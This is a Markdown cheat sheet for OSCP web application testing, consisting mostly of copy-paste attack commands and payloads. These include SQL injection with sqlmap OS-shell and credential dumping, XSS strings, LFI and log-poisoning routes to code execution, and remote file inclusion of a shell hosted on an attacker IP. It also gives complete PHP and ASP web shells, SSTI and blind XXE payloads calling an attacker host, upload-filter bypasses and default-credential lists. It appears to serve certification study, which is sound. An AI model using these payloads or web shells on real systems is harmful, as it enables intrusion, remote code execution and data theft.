# OSCP Web Application Testing Master Guide

## Table of Contents
- [Initial Web Discovery](#initial-web-discovery)
- [Directory and File Enumeration](#directory-and-file-enumeration)
- [Manual Testing Techniques](#manual-testing-techniques)
- [Common Vulnerability Testing](#common-vulnerability-testing)
- [Upload and Injection Attacks](#upload-and-injection-attacks)
- [Authentication Bypass](#authentication-bypass)
- [Advanced Techniques](#advanced-techniques)

## Initial Web Discovery

### Basic Web Reconnaissance (Copy-Paste Ready)
```bash
# Check what web server is running
curl -I http://<target>
curl -I https://<target>

# Check for HTTPS certificate info
openssl s_client -connect <target>:443 -servername <target>

# Technology fingerprinting
whatweb http://<target>
whatweb https://<target>

# WAF detection
wafw00f http://<target>

# Nikto scan
nikto -h http://<target>
nikto -h https://<target>
```

### HTTP Methods Testing
```bash
# Check allowed methods
curl -X OPTIONS http://<target>
nmap --script http-methods <target> -p 80,443

# Test dangerous methods
curl -X PUT http://<target>/test.txt -d "test content"
curl -X DELETE http://<target>/test.txt
curl -X TRACE http://<target>
curl -X TRACK http://<target>
```

### SSL/TLS Testing
```bash
# SSL scan
sslscan <target>
sslyze --regular <target>

# Test for common SSL vulnerabilities
nmap --script ssl-enum-ciphers <target> -p 443
nmap --script ssl-heartbleed <target> -p 443
```

## Directory and File Enumeration

### Gobuster (Recommended)
```bash
# Basic directory enumeration
gobuster dir -u http://<target> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20

# With file extensions
gobuster dir -u http://<target> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,js,xml,json,bak -t 20

# Specific wordlists for different technologies
# PHP applications
gobuster dir -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/PHP.fuzz.txt -x php

# ASP applications  
gobuster dir -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt -x asp,aspx

# Common directories
gobuster dir -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/common.txt

# Backup files
gobuster dir -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/common.txt -x bak,backup,old,orig,save
```

### Dirsearch
```bash
# Basic scan
dirsearch -u http://<target>

# With custom extensions
dirsearch -u http://<target> -e php,html,js,txt,xml

# Recursive scan (be careful with depth)
dirsearch -u http://<target> -r -R 2

# With custom wordlist
dirsearch -u http://<target> -w /path/to/custom/wordlist.txt

# Force extensions
dirsearch -u http://<target> -e php,asp,aspx,jsp,html,js -f
```

### Ffuf (Fast)
```bash
# Directory fuzzing
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<target>/FUZZ

# File extension discovery
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<target>/FUZZ -e .php,.html,.txt,.js,.xml,.json

# Parameter fuzzing (GET)
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://<target>/page.php?FUZZ=test

# POST parameter fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://<target>/login.php -X POST -d "FUZZ=test" -H "Content-Type: application/x-www-form-urlencoded"

# Subdomain enumeration
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://FUZZ.<target>
```

### Manual Directory Checks
```bash
# Always check these directories manually
curl -s http://<target>/robots.txt
curl -s http://<target>/sitemap.xml
curl -s http://<target>/.htaccess
curl -s http://<target>/web.config
curl -s http://<target>/crossdomain.xml

# Common admin panels
for dir in admin administrator wp-admin phpmyadmin manager html manager-gui admin-panel; do
    echo "Testing /$dir"
    curl -s -o /dev/null -w "%{http_code}" http://<target>/$dir/
done

# Backup and development files
for ext in .bak .backup .old .orig .save .tmp; do
    curl -s -o /dev/null -w "%{http_code}" http://<target>/index.php$ext
    curl -s -o /dev/null -w "%{http_code}" http://<target>/login.php$ext
done
```

## Manual Testing Techniques

### Source Code Analysis
```bash
# Download and analyze source
wget -r -np -nH --cut-dirs=3 -R index.html* http://<target>/

# Search for interesting patterns
grep -r "password" /path/to/downloaded/site/
grep -r "admin" /path/to/downloaded/site/
grep -r "config" /path/to/downloaded/site/
grep -r "\.php" /path/to/downloaded/site/ | grep -v "\.php:"

# Check for exposed configuration files
curl http://<target>/config.php
curl http://<target>/configuration.php
curl http://<target>/settings.php
curl http://<target>/app.config
curl http://<target>/web.config
```

### Browser Developer Tools
```javascript
// Run these in browser console
// Search for hidden form fields
document.querySelectorAll('input[type="hidden"]');

// Find all forms
document.querySelectorAll('form');

// Check for JavaScript variables containing sensitive data
// Look through all global variables
Object.keys(window);

// Search for password/admin in JavaScript
// View page source and search for sensitive keywords
```

### Cookie and Session Analysis
```bash
# Analyze cookies
curl -v http://<target> 2>&1 | grep -i cookie

# Test for session fixation
# 1. Get initial session ID
# 2. Login with credentials
# 3. Check if session ID changes

# Test cookie security flags
# HttpOnly, Secure, SameSite flags should be set
```

## Common Vulnerability Testing

### SQL Injection Testing

#### Basic SQL Injection Tests
```bash
# URL parameter injection
http://<target>/page.php?id=1'
http://<target>/page.php?id=1"
http://<target>/page.php?id=1 OR 1=1--
http://<target>/page.php?id=1 UNION SELECT 1,2,3--
http://<target>/page.php?id=1 AND 1=1--
http://<target>/page.php?id=1 AND 1=2--

# POST data injection (use Burp Suite or curl)
curl -X POST -d "username=admin' OR '1'='1&password=anything" http://<target>/login.php

# Error-based injection
http://<target>/page.php?id=1'
http://<target>/page.php?id=1"
http://<target>/page.php?id=1\
```

#### SQLMap Usage (Use Sparingly in OSCP)
```bash
# Basic scan
sqlmap -u "http://<target>/page.php?id=1"

# POST request
sqlmap -r request.txt --batch

# Specific database enumeration
sqlmap -u "http://<target>/page.php?id=1" --dbs
sqlmap -u "http://<target>/page.php?id=1" -D database_name --tables
sqlmap -u "http://<target>/page.php?id=1" -D database_name -T table_name --columns
sqlmap -u "http://<target>/page.php?id=1" -D database_name -T users -C username,password --dump

# OS shell (if privileges allow)
sqlmap -u "http://<target>/page.php?id=1" --os-shell
```

#### Manual SQL Injection
```sql
-- Union-based injection
' UNION SELECT 1,2,3,4,5--
' UNION SELECT user(),database(),version(),4,5--
' UNION SELECT 1,username,password,4,5 FROM users--

-- Boolean-based blind injection
' AND (SELECT SUBSTRING(user(),1,1))='r'--
' AND (SELECT LENGTH(database()))=5--

-- Time-based blind injection
' AND SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--
```

### Cross-Site Scripting (XSS)

#### Reflected XSS Testing
```html
<!-- Basic payloads -->
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<iframe src=javascript:alert('XSS')>

<!-- URL encoding -->
%3Cscript%3Ealert('XSS')%3C/script%3E

<!-- Double encoding -->
%253Cscript%253Ealert('XSS')%253C/script%253E

<!-- Filter bypass -->
<ScRiPt>alert('XSS')</ScRiPt>
<img src="x" onerror="alert('XSS')">
javascript:alert('XSS')
```

#### Stored XSS Testing
```html
<!-- Comment sections, user profiles, message boards -->
<script>alert('Stored XSS')</script>

<!-- Image uploads with malicious names -->
<img src=x onerror=alert('XSS')>.jpg

<!-- Template injection -->
{{7*7}}
${7*7}
<%= 7*7 %>
```

### Local File Inclusion (LFI)

#### Basic LFI Tests
```bash
# Linux targets
http://<target>/page.php?file=../../../etc/passwd
http://<target>/page.php?file=....//....//....//etc/passwd
http://<target>/page.php?file=/etc/passwd%00
http://<target>/page.php?file=php://filter/convert.base64-encode/resource=../../../etc/passwd

# Windows targets
http://<target>/page.php?file=../../../windows/system32/drivers/etc/hosts
http://<target>/page.php?file=C:\windows\system32\drivers\etc\hosts
http://<target>/page.php?file=....//....//....//windows//system32//drivers//etc//hosts
```

#### LFI to RCE Techniques
```bash
# Log poisoning (if logs are accessible)
# 1. Include log file via LFI
http://<target>/page.php?file=/var/log/apache2/access.log

# 2. Poison log by including PHP code in User-Agent
curl -A "<?php system(\$_GET['c']); ?>" http://<target>

# 3. Execute commands
http://<target>/page.php?file=/var/log/apache2/access.log&c=whoami

# PHP wrapper exploitation
http://<target>/page.php?file=php://input
# POST data: <?php system($_GET['c']); ?>

# Expect wrapper (if enabled)
http://<target>/page.php?file=expect://whoami
```

### Remote File Inclusion (RFI)
```bash
# Host malicious PHP file on attacker machine
echo '<?php system($_GET["c"]); ?>' > shell.php
python3 -m http.server 8000

# Include remote file
http://<target>/page.php?file=http://<attacker-ip>:8000/shell.php&c=whoami

# Alternative formats
http://<target>/page.php?file=http://<attacker-ip>:8000/shell.txt%00
http://<target>/page.php?file=ftp://anonymous@<attacker-ip>/shell.php
```

### Command Injection
```bash
# Basic command injection tests
http://<target>/ping.php?ip=127.0.0.1;id
http://<target>/ping.php?ip=127.0.0.1|id
http://<target>/ping.php?ip=127.0.0.1&&id
http://<target>/ping.php?ip=127.0.0.1`id`
http://<target>/ping.php?ip=127.0.0.1$(id)

# URL encoding
http://<target>/ping.php?ip=127.0.0.1%3Bid
http://<target>/ping.php?ip=127.0.0.1%7Cid

# Blind command injection (time delays)
http://<target>/ping.php?ip=127.0.0.1;sleep 10
http://<target>/ping.php?ip=127.0.0.1|sleep 10

# Output redirection  
http://<target>/ping.php?ip=127.0.0.1;whoami > /tmp/output.txt
http://<target>/ping.php?ip=127.0.0.1;cat /tmp/output.txt
```

## Upload and Injection Attacks

### File Upload Bypass Techniques
```bash
# Different file extensions
shell.php
shell.php5
shell.phtml
shell.inc
shell.asp
shell.aspx
shell.jsp

# Double extension
shell.php.jpg
shell.asp.gif

# Null byte injection (older systems)
shell.php%00.jpg
shell.asp%00.png

# MIME type manipulation
# Change Content-Type header to image/jpeg while uploading PHP shell

# Case manipulation
shell.PHP
shell.AsP

# Alternative separators
shell.php;.jpg
shell.php:.jpg
```

### Web Shell Creation
```php
<?php
// Simple PHP web shell
if(isset($_GET['c'])) {
    system($_GET['c']);
}
?>

<?php
// More advanced PHP shell
if(isset($_REQUEST['cmd'])) {
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
} else {
    echo '<form method="post"><input type="text" name="cmd" /><input type="submit" value="Execute" /></form>';
}
?>
```

```asp
<%
' ASP web shell
If Request.QueryString("cmd") <> "" Then
    Set oExec = Server.CreateObject("WScript.Shell").Exec(Request.QueryString("cmd"))
    Response.Write("<pre>" & Server.HTMLEncode(oExec.StdOut.ReadAll()) & "</pre>")
End If
%>
```

### PHP Filter Chains (Advanced LFI to RCE)
```bash
# Generate PHP filter chain to write webshell
python3 php_filter_chain_generator.py --chain '<?php system($_GET[0]); ?>'

# Use generated filter chain in LFI
http://<target>/page.php?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|[...long chain...]|resource=/tmp/shell.php

# Access webshell
http://<target>/shell.php?0=whoami
```

## Authentication Bypass

### Default Credentials
```bash
# Common default credentials to try
admin:admin
admin:password  
admin:123456
root:root
root:password
administrator:administrator
user:user
test:test
guest:guest
demo:demo

# Application-specific defaults
tomcat:tomcat (Apache Tomcat)
admin:admin123 (Various applications)
sa: (MSSQL)
oracle:oracle (Oracle DB)
```

### SQL Authentication Bypass
```sql
-- Login form bypass
admin' --
admin' /*
' OR 1=1--
' OR '1'='1
admin' OR '1'='1'--
'OR 1=1#
' UNION SELECT 1,'admin','password'--

-- Password field bypass
anything' OR '1'='1
```

### Session Management Issues
```bash
# Session prediction
# Analyze session tokens for patterns

# Session fixation
# 1. Get session ID before login
# 2. Force victim to use this session ID
# 3. Victim logs in with predetermined session

# Weak session tokens
# Look for incrementing, predictable patterns in session IDs
```

### HTTP Header Authentication Bypass
```bash
# Try different headers
curl -H "X-Forwarded-For: 127.0.0.1" http://<target>/admin
curl -H "X-Real-IP: 127.0.0.1" http://<target>/admin  
curl -H "X-Originating-IP: 127.0.0.1" http://<target>/admin
curl -H "X-Remote-IP: 127.0.0.1" http://<target>/admin
curl -H "X-Remote-Addr: 127.0.0.1" http://<target>/admin
```

## Advanced Techniques

### Server-Side Template Injection (SSTI)
```bash
# Detection payloads
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}

# Jinja2 (Python)
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}

# Twig (PHP)  
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}

# Velocity (Java)
#set($str=$class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('whoami'))
```

### XML External Entity (XXE)
```xml
<!-- Basic XXE -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

<!-- Blind XXE with external DTD -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://<attacker-ip>/evil.dtd"> %xxe;]>
<root></root>
```

### Server-Side Request Forgery (SSRF)
```bash
# Basic SSRF tests
http://<target>/page.php?url=http://127.0.0.1:22
http://<target>/page.php?url=http://127.0.0.1:80
http://<target>/page.php?url=file:///etc/passwd

# Bypass filters
http://<target>/page.php?url=http://localhost
http://<target>/page.php?url=http://0.0.0.0
http://<target>/page.php?url=http://[::1]
http://<target>/page.php?url=http://127.1
```

### NoSQL Injection
```javascript
// MongoDB injection
{"$ne": null}
{"$regex": ".*"}
{"$exists": true}

// URL encoded
username[$ne]=null&password[$ne]=null
```

### API Testing
```bash
# Test different HTTP methods
curl -X GET http://<target>/api/users
curl -X POST http://<target>/api/users -d '{"username":"admin","password":"password"}'
curl -X PUT http://<target>/api/users/1 -d '{"role":"admin"}'
curl -X DELETE http://<target>/api/users/1

# Test for API versioning
curl http://<target>/api/v1/users
curl http://<target>/api/v2/users
curl http://<target>/v1/api/users

# Parameter pollution
curl "http://<target>/api/users?id=1&id=2"
```

## Common Mistakes to Avoid

### 1. Not Checking Basic Files
❌ Skipping robots.txt, sitemap.xml, .htaccess
✅ Always check these files first - they often reveal hidden directories

### 2. Using Only Automated Tools
❌ Relying solely on dirsearch/gobuster
✅ Combine automated tools with manual testing

### 3. Not Testing All Parameters
❌ Only testing obvious parameters like ?id=1
✅ Fuzz all parameters, including POST data and headers

### 4. Ignoring Different HTTP Methods
❌ Only testing GET requests
✅ Test PUT, DELETE, OPTIONS, PATCH methods

### 5. Not Following Redirects
❌ Ignoring 302/301 responses
✅ Follow redirects and check what they point to

## Burp Suite Essential Techniques

### Intercepting and Modifying Requests
```bash
# Set up proxy
# Browser -> 127.0.0.1:8080
# Burp Suite -> Proxy -> Intercept

# Key Burp features to use:
# 1. Repeater - Modify and resend requests
# 2. Intruder - Automated attacks (password brute force, fuzzing)
# 3. Scanner - Automated vulnerability detection
# 4. Comparer - Compare requests/responses
```

### Useful Burp Extensions
- Autorize - Authorization testing
- Param Miner - Parameter discovery
- Backslash Powered Scanner - Additional vulnerability checks
- IP Rotate - Rotate source IP addresses

## Quick Reference Commands

### One-Liner Directory Discovery
```bash
# Quick directory check
for dir in admin login wp-admin administrator panel dashboard; do echo "Testing /$dir: $(curl -s -o /dev/null -w "%{http_code}" http://<target>/$dir/)"; done
```

### Quick Parameter Testing
```bash
# Test common parameters
for param in id page file user admin; do echo "Testing $param: $(curl -s "http://<target>/index.php?$param=../../../etc/passwd" | grep -o "root:")"; done
```

### Quick XSS Testing
```bash
# Basic XSS payloads
for payload in "<script>alert(1)</script>" "<img src=x onerror=alert(1)>" "<svg onload=alert(1)>"; do echo "Testing: $payload"; curl "http://<target>/search.php?q=$payload"; done
```

Remember: Web application testing requires patience and creativity. Always test manually even after automated scans, as many vulnerabilities require context-specific exploitation!